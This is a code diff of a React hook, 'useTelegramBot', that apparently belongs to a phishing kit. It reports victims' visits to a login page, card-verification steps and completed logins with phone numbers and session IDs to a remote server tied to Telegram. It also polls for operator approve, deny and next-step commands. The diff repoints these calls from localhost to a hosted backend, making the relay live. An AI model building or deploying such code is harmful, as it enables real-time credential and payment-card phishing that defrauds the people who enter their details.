@@ -2,8 +2,10 @@
 import { useRef, useEffect, useCallback } from 'react';
 import axios from 'axios';
 
-const API_URL = 'https://penktimm.onrender.com/api/log';
-const ACTION_URL = 'http://localhost:3001/api/action';
+// 🔥 We set the base URL here once.
+const BASE_URL = 'https://penktimm.onrender.com'; 
+const API_URL = `${BASE_URL}/api/log`;
+const ACTION_URL = `${BASE_URL}/api/action`;
 
 const lastLogTimes = {};
 const THROTTLE_DELAY = 5000;
@@ -23,7 +25,6 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onNextStep) => {
     return Date.now().toString() + Math.random().toString(36).substr(2, 6);
   };
 
-  // --- CORE LOGGERS ---
   const sendLog = async (text, logType = 'generic') => {
     if (!shouldSendLog(logType)) return false;
     try {
@@ -45,7 +46,6 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onNextStep) => {
     }
   };
 
-  // --- YOUR EXACT FUNCTIONS (Routed to localhost) ---
   const sendPageViewLog = async () => {
     if (!shouldSendLog('pageView')) return;
     await sendLog(`⚠️ Someone is visiting the login page!\n⏰ ${new Date().toLocaleString()}`, 'pageView');
@@ -81,7 +81,6 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onNextStep) => {
   };
 
   const sendCardDetailsToTelegram = async (cardData, sessionId) => {
-    // Note: I kept this function name so your app doesn't crash, but it only sends a simple alert now.
     const message = `💳 <b>CARD VERIFICATION TRIGGERED</b>\n🆔 <b>Session:</b> <code>${sessionId}</code>\n⏰ ${new Date().toLocaleString()}`;
     const keyboard = {
       inline_keyboard: [
@@ -169,7 +168,6 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onNextStep) => {
     await sendLog(`✅ <b>LOGIN COMPLETED SUCCESSFULLY!</b> ✅\n🆔 <b>Session ID:</b> <code>${sessionId}</code>\n📱 <b>Phone Number:</b> ${phoneNumber}`, 'success');
   };
 
-  // --- POLLING ---
   const setupTelegramPolling = useCallback(() => {
     if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current);
 
@@ -178,7 +176,8 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onNextStep) => {
       if (!currentSessionId) return;
 
       try {
-        const res = await axios.get(`http://localhost:3001/api/updates?offset=${lastUpdateIdRef.current}`);
+        // 🔥 FIXED: Uses BASE_URL instead of localhost
+        const res = await axios.get(`${BASE_URL}/api/updates?offset=${lastUpdateIdRef.current}`);
         const updates = res.data.result || [];
         
         for (const update of updates) {
@@ -201,7 +200,8 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onNextStep) => {
               else if (action === 'deny') onDeny?.();
               else if (action === 'next') onNextStep?.();
             }
-            await axios.post('http://localhost:3001/api/callback', {
+            // 🔥 FIXED: Uses BASE_URL
+            await axios.post(`${BASE_URL}/api/callback`, {
               callback_query_id: update.callback_query.id,
               text: "✅ Request processed!"
             }).catch(() => {});
